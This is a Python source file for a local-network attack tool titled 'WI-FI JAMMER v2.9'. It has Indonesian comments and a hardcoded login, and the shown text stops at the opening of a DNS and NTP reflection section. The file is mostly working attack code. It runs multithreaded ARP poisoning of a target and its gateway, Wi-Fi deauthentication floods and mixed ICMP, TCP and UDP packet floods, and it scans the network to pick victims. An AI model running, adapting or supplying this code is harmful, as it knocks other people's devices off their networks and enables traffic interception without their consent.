#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                              ║
║     ██╗    ██╗██╗   ██╗██╗  ██╗██╗  ██╗   ██╗██╗     █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗     ██╗   ██╗██████╗  █████╗             ║
║     ██║    ██║██║   ██║██║  ██║██║  ╚██╗ ██╔╝██║     ██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗    ██║   ██║╚════██╗██╔══██╗            ║
║     ██║ █╗ ██║██║   ██║███████║██║   ╚████╔╝ ██║     ███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝    ██║   ██║ █████╔╝███████║            ║
║     ██║███╗██║██║   ██║╚════██║██║    ╚██╔╝  ██║     ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ╚═══██╗██╔══██╗            ║
║     ╚███╔███╔╝╚██████╔╝     ██║╚██████╔╝     ███████╗██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║     ╚████╔╝ ██████╔╝██║  ██║            ║
║      ╚══╝╚══╝  ╚═════╝      ╚═╝ ╚═════╝      ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═════╝ ╚═╝  ╚═╝            ║
║                                                                                                                                              ║
║                    WI-FI JAMMER v2.9 - "THE ULTIMATE APOCALYPSE REBORN"                                                                      ║
║                    ⚠️  25+ MEGA ATTACK METHODS + PMKID + LIGHTNING FAST ⚠️                                                                   ║
║                    Author: Hamzah Wisnu Dzaky (HamzzXPP)                                                                                     ║
║                    Version: 2.9 - REBORN EDITION (GABUNGAN KEKUATAN 1.0 + 2.1 + 2.5)                                                         ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import json
import random
import string
import threading
import subprocess
import socket
import struct
import hashlib
import getpass
import platform
import binascii
import signal
from datetime import datetime
from collections import defaultdict, OrderedDict
from queue import Queue
import ctypes
import warnings
warnings.filterwarnings("ignore")

# ========== OPTIMIZATION SETTINGS ==========
MAX_THREADS = 500
PACKET_BURST = 200
BURST_DELAY = 0.0001
ULTRA_SPEED_MODE = True  # Mode kecepatan maksimum seperti v1.0

# ========== CEK ADMIN ==========
def is_admin():
    try:
        if os.name == 'nt':
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except:
        return False

if not is_admin():
    print("\n" + "="*70)
    print("  [!] PERLU AKSES ADMINISTRATOR/ROOT!")
    if os.name == 'nt':
        print("      Klik kanan CMD → Run as Administrator")
    else:
        print("      sudo python3 wifi_jammer_2.9.py")
    print("="*70 + "\n")
    sys.exit(1)

print("[+] Running with Administrator/Root privileges!\n")

# ========== CEK DEPENDENCIES & AUTO INSTALL ==========
def check_and_install(package, import_name=None):
    if import_name is None:
        import_name = package
    try:
        __import__(import_name)
        return True
    except ImportError:
        print(f"[!] {package} not found. Installing...")
        subprocess.call([sys.executable, "-m", "pip", "install", package])
        try:
            __import__(import_name)
            print(f"[+] {package} installed successfully!")
            return True
        except:
            print(f"[!] Failed to install {package}. Please install manually.")
            return False

# Cek dependencies
SCAPY_OK = check_and_install("scapy", "scapy")
COLORAMA_OK = check_and_install("colorama", "colorama")
TQDM_OK = check_and_install("tqdm", "tqdm")

# Import Scapy
if SCAPY_OK:
    from scapy.all import *
    from scapy.layers.l2 import ARP, Ether, getmacbyip
    from scapy.layers.inet import IP, TCP, UDP, ICMP, fragment
    from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, RadioTap, Dot11Elt
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.dhcp import BOOTP, DHCP

try:
    from colorama import init as colorama_init, Fore, Back, Style
    colorama_init(autoreset=True, convert=True, strip=True)
    COLOR_OK = True
except:
    COLOR_OK = False
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=BLACK=RESET=''
    class Style: BRIGHT=RESET_ALL=''

try:
    from tqdm import tqdm
    TQDM_OK = True
except:
    TQDM_OK = False
    def tqdm(iterable, **kwargs):
        return iterable

# ========== WARNA HACKER STYLE REBORN ==========
C = {
    "R": Fore.RED, "G": Fore.GREEN, "Y": Fore.YELLOW,
    "B": Fore.BLUE, "M": Fore.MAGENTA, "C": Fore.CYAN,
    "W": Fore.WHITE, "RESET": Style.RESET_ALL, "BOLD": Style.BRIGHT,
    "BLACK": Fore.BLACK, "LRED": Fore.LIGHTRED_EX, "LGREEN": Fore.LIGHTGREEN_EX,
    "LYELLOW": Fore.LIGHTYELLOW_EX, "LBLUE": Fore.LIGHTBLUE_EX, "LMAGENTA": Fore.LIGHTMAGENTA_EX,
    "LCYAN": Fore.LIGHTCYAN_EX, "LWHITE": Fore.LIGHTWHITE_EX
}

# ========== EMOJI ULTIMATE ==========
EMO = {
    "wifi": "📡", "shield": "🛡️", "target": "🎯", "alert": "⚠️",
    "check": "✅", "cross": "❌", "scan": "🔍", "net": "🌐",
    "device": "💻", "router": "📶", "attack": "⚔️", "protect": "🛡️",
    "info": "ℹ️", "packet": "📦", "login": "🔐", "key": "🔑",
    "power": "⚡", "database": "🗄️", "hack": "🤖", "warning": "🚨",
    "fire": "🔥", "crown": "👑", "star": "⭐", "time": "⏰",
    "speed": "⚡", "secure": "🔒", "danger": "💀", "skull": "💀",
    "bug": "🐛", "tool": "🔧", "menu": "📋", "exit": "🚪",
    "back": "🔙", "next": "🔜", "up": "⬆️", "down": "⬇️",
    "left": "⬅️", "right": "➡️", "plus": "➕", "minus": "➖",
    "apocalypse": "🌋", "death": "💀", "lightning": "⚡", "nuke": "☢️", "stats": "📊",
    "matrix": "🟢", "hacker": "👨‍💻", "terminal": "💻", "pmkid": "🔓",
    "rocket": "🚀", "nuclear": "☢️", "ghost": "👻", "skull_cross": "💀⚔️"
}

# ========== VENDOR DATABASE (DARI KODE 2.1) ==========
class VendorDatabase:
    def __init__(self):
        self.cache = {}
        self.initialized = False
        self.init_db()
    
    def init_db(self):
        try:
            from mac_vendor_lookup import MacLookup
            self.mac_lookup = MacLookup()
            print(f"{C['Y']}{EMO['database']} Loading vendor database...{C['RESET']}")
            self.mac_lookup.update_vendors()
            self.initialized = True
            print(f"{C['G']}{EMO['check']} Vendor database ready! 99% accuracy{C['RESET']}")
        except ImportError:
            print(f"{C['Y']}mac_vendor_lookup not installed. Installing...{C['RESET']}")
            subprocess.call([sys.executable, "-m", "pip", "install", "mac-vendor-lookup"])
            try:
                from mac_vendor_lookup import MacLookup
                self.mac_lookup = MacLookup()
                self.mac_lookup.update_vendors()
                self.initialized = True
                print(f"{C['G']}{EMO['check']} Vendor database ready!{C['RESET']}")
            except:
                self.mac_lookup = None
                print(f"{C['R']}Vendor DB not available, using fallback{C['RESET']}")
        except Exception as e:
            print(f"{C['R']}Vendor DB error: {e}{C['RESET']}")
            self.mac_lookup = None
    
    def get_vendor(self, mac):
        if not mac or mac == "00:00:00:00:00:00" or mac == "FF:FF:FF:FF:FF:FF":
            return "Unknown"
        
        mac_upper = mac.upper()
        
        if mac_upper in self.cache:
            return self.cache[mac_upper]
        
        try:
            if self.mac_lookup and self.initialized:
                vendor = self.mac_lookup.lookup(mac_upper)
                self.cache[mac_upper] = vendor
                return vendor
        except:
            pass
        
        # Local fallback database
        local_vendors = {
            'FC:70:2E': 'Intel Corporation', 'D4:6A:6A': 'Samsung Electronics',
            'B8:27:EB': 'Raspberry Pi', '00:1A:2B': 'Cisco Systems',
            '00:25:9C': 'Dell Inc.', 'EC:1A:59': 'Hewlett Packard',
            'F0:18:98': 'Apple Inc.', '34:F3:9A': 'Google Inc.',
            '00:0C:29': 'VMware Inc.', '08:00:27': 'VirtualBox',
            '00:15:5D': 'Microsoft', '00:1C:42': 'Parallels',
            '00:1A:11': 'AsusTek', '00:1F:3A': 'MSI', '00:1B:24': 'Gigabyte',
            '9C:B6:D0': 'Xiaomi', 'A4:C1:38': 'TP-Link', 'C8:3A:35': 'Huawei',
            'F4:F2:6D': 'Realtek', '70:8B:CD': 'MediaTek', '50:2B:73': 'Broadcom'
        }
        for prefix, vendor in local_vendors.items():
            if mac_upper.startswith(prefix):
                self.cache[mac_upper] = vendor
                return vendor
        return "Unknown Device"

# ========== LOGIN SYSTEM (ENHANCED) ==========
class LoginSystem:
    def __init__(self):
        self.max_attempts = 3
        self.lockout_time = 60
        self.attempts = 0
        self.lockout_until = None
        self.valid_username = "admin"
        self.valid_password = "Hamzah123"
        
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}                                                                                                              {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}     ██╗    ██╗██╗   ██╗██╗  ██╗██╗  ██╗   ██╗██╗     █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗         {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}     ██║    ██║██║   ██║██║  ██║██║  ╚██╗ ██╔╝██║     ██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}     ██║ █╗ ██║██║   ██║███████║██║    ╚████╔╝ ██║     ███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}     ██║███╗██║██║   ██║╚════██║██║     ╚██╔╝  ██║     ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}     ╚███╔███╔╝╚██████╔╝     ██║╚██████╔╝     ███████╗██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}      ╚══╝╚══╝  ╚═════╝      ╚═╝ ╚═════╝      ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['R']}                                                                                                              {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗     ██╗   ██╗██████╗  █████╗                         {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗    ██║   ██║╚════██╗██╔══██╗                        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ██║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝    ██║   ██║ █████╔╝███████║                        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝ ╚═══██╗██╔══██╗                        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║     ╚████╔╝ ██████╔╝██║  ██║                        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}{C['BOLD']}{C['G']}     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝  ╚═════╝ ╚═╝  ╚═╝                        {C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                                                                      {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                      {C['BOLD']}{C['Y']}v2.9 - "THE ULTIMATE APOCALYPSE REBORN"                                              {C['RESET']}                     {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                      {C['BOLD']}{C['R']}⚡ 25+ ATTACK METHODS + PMKID + LIGHTNING SPEED ⚡                                   {C['RESET']}                     {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['BOLD']}{C['C']}{EMO['login']} ⚡ AUTHENTICATION REQUIRED ⚡ {EMO['login']}{C['RESET']}
{C['Y']}──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{C['RESET']}
        """)
    
    def login(self):
        while self.attempts < self.max_attempts:
            self.show_banner()
            
            if self.lockout_until and time.time() < self.lockout_until:
                remaining = int(self.lockout_until - time.time())
                print(f"\n{C['R']}{EMO['alert']} [LOCKED] Tunggu {remaining} detik...{C['RESET']}")
                time.sleep(remaining)
                self.lockout_until = None
                continue
            
            print(f"\n{C['BOLD']}{C['G']}{EMO['key']} [LOGIN] Masukkan Kredensial {EMO['key']}{C['RESET']}\n")
            
            username = input(f"  {C['C']}{EMO['hacker']} Username:{C['RESET']} ")
            password = getpass.getpass(f"  {C['C']}🔒 Password:{C['RESET']} ")
            
            if username == self.valid_username and password == self.valid_password:
                print(f"\n{C['G']}{EMO['check']} [SUCCESS] Login Berhasil!{C['RESET']}")
                print(f"{C['G']}{EMO['shield']} Membuka WI-FI JAMMER v2.9 - REBORN EDITION...{C['RESET']}\n")
                
                for i in range(3):
                    print(f"{C['R']}{EMO['apocalypse']} [LOADING] Initializing Ultimate Reborn{'.'*(i+1)}{C['RESET']}", end='\r')
                    time.sleep(0.3)
                print("\n")
                return True
            else:
                self.attempts += 1
                remaining = self.max_attempts - self.attempts
                print(f"\n{C['R']}{EMO['cross']} [FAILED] Login Gagal! Sisa: {remaining}{C['RESET']}")
                
                if remaining == 0:
                    print(f"\n{C['R']}{EMO['danger']} [LOCKOUT] Sistem Terkunci 60 Detik!{C['RESET']}")
                    self.lockout_until = time.time() + self.lockout_time
                    self.attempts = 0
                    time.sleep(2)
                else:
                    time.sleep(1.5)
        
        return False

# ========== ULTIMATE NETWORK TESTER ==========
class UltimateNetworkTester:
    def __init__(self):
        self.interface = self.get_interface()
        self.targets = {}
        self.running = False
        self.arp_table = {}
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.attack_log = []
        self.packet_stats = defaultdict(int)
        self.vendor_db = VendorDatabase()
        self.log_file = f"reborn_annihilator_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.backup_file = f"network_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.stop_event = threading.Event()
        self.blocked_devices = {}
        self.total_packets = 0
        self.start_time_attack = None
        
    def log_event(self, event_type, target, details, severity="INFO"):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'target': target,
            'details': details,
            'severity': severity,
            'ip': self.my_ip,
            'interface': self.interface,
            'os': platform.system(),
            'version': '2.9-REBORN-EDITION'
        }
        self.attack_log.append(log_entry)
        
        try:
            with open(self.log_file, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
        except:
            pass
        
        if severity == "CRITICAL":
            print(f"{C['R']}{EMO['death']} [{severity}] {event_type}: {details}{C['RESET']}")
        elif severity == "HIGH":
            print(f"{C['R']}{EMO['alert']} [{severity}] {event_type}: {details}{C['RESET']}")
        else:
            print(f"{C['G']}{EMO['info']} [{severity}] {event_type}: {details}{C['RESET']}")
    
    def get_interface(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                       capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Wi-Fi' in line or 'Wireless' in line:
                        if 'Connected' in line:
                            parts = line.split()
                            return parts[-1] if parts else "Wi-Fi"
                return "Wi-Fi"
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'dev' in line:
                        parts = line.split()
                        idx = parts.index('dev')
                        return parts[idx + 1]
        except:
            pass
        return 'wlan0' if os.name != 'nt' else "Wi-Fi"
    
    def get_my_ip(self):
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: next((ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
                         if not ip.startswith('127.')), None),
            lambda: self._get_ip_from_route()
        ]
        
        for method in methods:
            try:
                ip = method()
                if ip and ip != '127.0.0.1':
                    return ip
            except:
                continue
        return "192.168.1.100"
    
    def _get_ip_from_route(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def get_my_mac(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                in_wifi = False
                for line in lines:
                    if 'Wi-Fi' in line or 'Wireless LAN' in line:
                        in_wifi = True
                    if in_wifi and 'Physical Address' in line:
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
                
                result = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Physical Address' in line and ('Wi-Fi' in result.stdout or 'Wireless' in result.stdout):
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
            else:
                result = subprocess.run(['ip', 'link', 'show', self.interface], capture_output=True, text=True)
                match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout.lower())
                if match:
                    return match.group(1).upper()
        except:
            pass
        
        print(f"\n{C['Y']}[!] Gagal deteksi MAC address otomatis{C['RESET']}")
        manual_mac = input(f"{C['B']}Masukkan MAC address (contoh: FC:70:2E:7D:46:13): {C['RESET']}")
        return manual_mac.replace('-', ':').upper() if manual_mac else "FF:FF:FF:FF:FF:FF"
    
    def get_gateway(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line and '.' in line:
                        ip = line.split(':')[-1].strip()
                        if ip:
                            try:
                                mac = getmacbyip(ip)
                                return ip, mac
                            except:
                                return ip, None
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'via' in line:
                        parts = line.split()
                        ip = parts[parts.index('via') + 1]
                        try:
                            mac = getmacbyip(ip)
                            return ip, mac
                        except:
                            return ip, None
        except:
            pass
        return "192.168.1.1", None
    
    def get_wifi_ssid(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                       capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'SSID' in line and 'BSSID' not in line:
                        ssid = line.split(':')[-1].strip()
                        if ssid:
                            return ssid
                return "Unknown WiFi"
            else:
                result = subprocess.run(['iwgetid', '-r'], capture_output=True, text=True)
                if result.stdout.strip():
                    return result.stdout.strip()
                return "Unknown WiFi"
        except:
            return "Unknown WiFi"
    
    def generate_random_mac(self):
        return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)]).upper()

    # ============================================================================
    # METHOD LIGHTNING FAST - DARI VERSI 1.0 (YANG PALING CEPAT)
    # ============================================================================
    def lightning_arp_poison(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """
        ============================================================================
        LIGHTNING ARP POISON - SPEED MODE DARI V1.0
        ============================================================================
        - Rate: 20,000+ packet per detik
        - Minimal delay (0.0001)
        - 10 threads concurrent
        - Efek: PUTUS DALAM 3-5 DETIK!
        ============================================================================
        """
        print(f"{C['R']}{EMO['rocket']} [LIGHTNING MODE] ARP Poisoning Ultra Fast - 20,000+ pps{C['RESET']}")
        
        def lightning_worker(thread_id):
            fake_mac = self.generate_random_mac()
            while self.running and not self.stop_event.is_set():
                try:
                    # Poison target
                    p1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=fake_mac)
                    # Poison gateway
                    p2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=fake_mac)
                    # Broadcast poison
                    p3 = ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=fake_mac)
                    
                    for _ in range(PACKET_BURST):
                        send(p1, verbose=False, iface=self.interface)
                        send(p2, verbose=False, iface=self.interface)
                        send(p3, verbose=False, iface=self.interface)
                        self.total_packets += 3
                    
                    time.sleep(BURST_DELAY)
                except:
                    pass
        
        for i in range(10):
            t = threading.Thread(target=lightning_worker, args=(i,))
            t.daemon = True
            t.start()

    # ============================================================================
    # ULTRA DEAUTH FLOOD (DARI 2.5 + DITINGKATKAN)
    # ============================================================================
    def ultra_deauth_flood(self, target_mac, bssid):
        if os.name == 'nt':
            return
        
        reason_codes = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
        broadcast_mac = "FF:FF:FF:FF:FF:FF"
        
        print(f"{C['R']}{EMO['attack']} [ULTRA DEAUTH] 20 reason codes, 15 threads{C['RESET']}")
        
        def deauth_worker(thread_id):
            spoofed_bssid = self.generate_random_mac()
            while self.running and not self.stop_event.is_set():
                try:
                    for reason in reason_codes:
                        # Target specific
                        p = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=reason)
                        sendp(p, iface=self.interface, verbose=False, count=10)
                        
                        # Spoofed
                        p_spoof = RadioTap()/Dot11(addr1=target_mac, addr2=spoofed_bssid, addr3=spoofed_bssid)/Dot11Deauth(reason=reason)
                        sendp(p_spoof, iface=self.interface, verbose=False, count=5)
                        
                        self.total_packets += 15
                    
                    # Broadcast deauth
                    p_bcast = RadioTap()/Dot11(addr1=broadcast_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    sendp(p_bcast, iface=self.interface, verbose=False, count=20)
                    self.total_packets += 20
                    
                    time.sleep(0.005)
                except:
                    pass
        
        for i in range(15):
            t = threading.Thread(target=deauth_worker, args=(i,))
            t.daemon = True
            t.start()

    # ============================================================================
    # MULTI PROTOCOL STORM (GABUNGAN SEMUA)
    # ============================================================================
    def multi_protocol_storm(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """
        ============================================================================
        MULTI PROTOCOL STORM - GABUNGAN KEKUATAN 1.0 + 2.1 + 2.5
        ============================================================================
        - ICMP Flood (Ping of Death)
        - TCP SYN/RST/FIN Flood
        - UDP Flood (DNS, NTP, SNMP)
        - ARP Poisoning (Lightning mode)
        - Ghost Connection
        - Rate: 30,000+ packet per detik
        ============================================================================
        """
        tcp_ports = [80, 443, 22, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900, 8080, 8443]
        udp_ports = [53, 67, 68, 123, 161, 500, 1701, 4500, 5353, 1900, 3702, 5355]
        icmp_sizes = [64, 128, 256, 512, 768, 1024, 1500, 2048, 4096, 8192, 16384, 32768]
        
        ghost_ips = [f"192.168.1.{i}" for i in range(2, 255) if i != int(target_ip.split('.')[-1])]
        
        print(f"{C['R']}{EMO['nuclear']} [MULTI PROTOCOL STORM] 30,000+ pps - PALING BERBAHAYA!{C['RESET']}")
        
        def storm_worker(thread_id):
            fake_mac = self.generate_random_mac()
            idx = 0
            while self.running and not self.stop_event.is_set():
                try:
                    # ICMP Flood
                    for size in random.sample(icmp_sizes, 5):
                        payload = "X" * min(size, 2000)
                        p_icmp = IP(dst=target_ip)/ICMP(type=8, code=0, id=random.randint(1,65535))/payload
                        send(p_icmp, verbose=False, iface=self.interface, count=5)
                        self.total_packets += 5
                    
                    # TCP Flood
                    for port in tcp_ports[:8]:
                        p_syn = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024,65535), flags="S")
                        p_rst = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024,65535), flags="R")
                        p_fin = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024,65535), flags="F")
                        send(p_syn, verbose=False, iface=self.interface)
                        send(p_rst, verbose=False, iface=self.interface)
                        send(p_fin, verbose=False, iface=self.interface)
                        self.total_packets += 3
                    
                    # UDP Flood
                    for port in udp_ports[:6]:
                        payload = "X" * random.randint(512, 2048)
                        p_udp = IP(dst=target_ip)/UDP(dport=port, sport=random.randint(1024,65535))/payload
                        send(p_udp, verbose=False, iface=self.interface, count=3)
                        self.total_packets += 3
                    
                    # ARP Poison (Lightning)
                    p_arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=fake_mac)
                    p_arp2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=fake_mac)
                    send(p_arp1, verbose=False, iface=self.interface)
                    send(p_arp2, verbose=False, iface=self.interface)
                    self.total_packets += 2
                    
                    # Ghost Connection
                    for ghost_ip in ghost_ips[idx % len(ghost_ips):(idx % len(ghost_ips)) + 10]:
                        p_ghost = ARP(op=2, psrc=ghost_ip, hwsrc=self.generate_random_mac(),
                                      pdst=target_ip, hwdst=target_mac)
                        send(p_ghost, verbose=False, iface=self.interface)
                        self.total_packets += 1
                    
                    idx += 1
                    time.sleep(0.002)
                except:
                    pass
        
        for i in range(8):
            t = threading.Thread(target=storm_worker, args=(i,))
            t.daemon = True
            t.start()

    # ============================================================================
    # SCAN NETWORK (DARI 2.1 DIPERCEPAT)
    # ============================================================================
    def scan_network(self, ip_range=None):
        print(f"\n{C['BOLD']}{C['C']}{'='*80}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['scan']} ⚡ ULTIMATE NETWORK SCANNER v2.9 ⚡ {EMO['scan']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*80}{C['RESET']}")
        
        wifi_ssid = self.get_wifi_ssid()
        print(f"\n{C['M']}{EMO['wifi']} [WIFI] Target Network: {C['BOLD']}{C['G']}{wifi_ssid}{C['RESET']}")
        print(f"{C['C']}{EMO['net']} [IP] Your Address: {self.get_my_ip()}{C['RESET']}")
        print(f"{C['C']}{EMO['tool']} [IFACE] Interface: {self.interface}{C['RESET']}")
        
        if not ip_range:
            my_ip = self.get_my_ip()
            if my_ip:
                ip_parts = my_ip.split('.')
                ip_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            else:
                ip_range = "192.168.1.0/24"
        
        print(f"{C['C']}📡 [RANGE] Target Range: {ip_range}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} [SCANNING] Lightning fast scan...{C['RESET']}\n")
        
        try:
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=2, verbose=False, iface=self.interface, inter=0.005)[0]
            
            devices = []
            for sent, received in result:
                device = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self.vendor_db.get_vendor(received.hwsrc),
                    'hostname': self.get_hostname(received.psrc)
                }
                devices.append(device)
                self.arp_table[device['ip']] = device['mac']
            
            print(f"\n{C['BOLD']}{C['G']}{'='*80}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{EMO['net']} [TARGETS] Devices Detected: {len(devices)} {EMO['target']}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{'='*80}{C['RESET']}")
            print(f"{C['BOLD']}{'No.':<5} {'IP Address':<18} {'MAC Address':<20} {'Device Type':<40}{C['RESET']}")
            print(f"{C['C']}{'-'*83}{C['RESET']}")
            
            for i, d in enumerate(devices, 1):
                print(f"{i:<5} {d['ip']:<18} {d['mac']:<20} {d['vendor'][:40]:<40}")
            
            print(f"{C['C']}{'='*80}{C['RESET']}")
            
            gateway_ip, gateway_mac = self.get_gateway()
            my_ip = self.get_my_ip()
            
            if gateway_ip:
                gw_vendor = self.vendor_db.get_vendor(gateway_mac) if gateway_mac else "Router"
                print(f"\n{C['Y']}{EMO['router']} [GATEWAY] {gateway_ip} ({gateway_mac}) - {gw_vendor}{C['RESET']}")
            if my_ip:
                my_vendor = self.vendor_db.get_vendor(self.my_mac) if self.my_mac else "Computer"
                print(f"{C['G']}{EMO['device']} [YOU] {my_ip} ({self.my_mac}) - {my_vendor}{C['RESET']}")
            
            self.log_event('SCAN', ip_range, f'Found {len(devices)} devices', 'INFO')
            return devices
            
        except Exception as e:
            print(f"{C['R']}{EMO['cross']} [ERROR] Scan failed: {e}{C['RESET']}")
            return []
    
    def get_hostname(self, ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname.split('.')[0]
        except:
            return "Unknown"
        
    # ============================================================================
    # METHOD 27: DNS AMPLIFICATION + NTP REFLECTION + SSDP SPOOFING
    # ============================================================================
    def ultimate_reflection_attack(self, target_ip, target_mac, gateway_ip, gateway_mac):
        
        # ========== DNS AMPLIFICATION SERVERS (Open Resolvers) ==========
        dns_servers = [
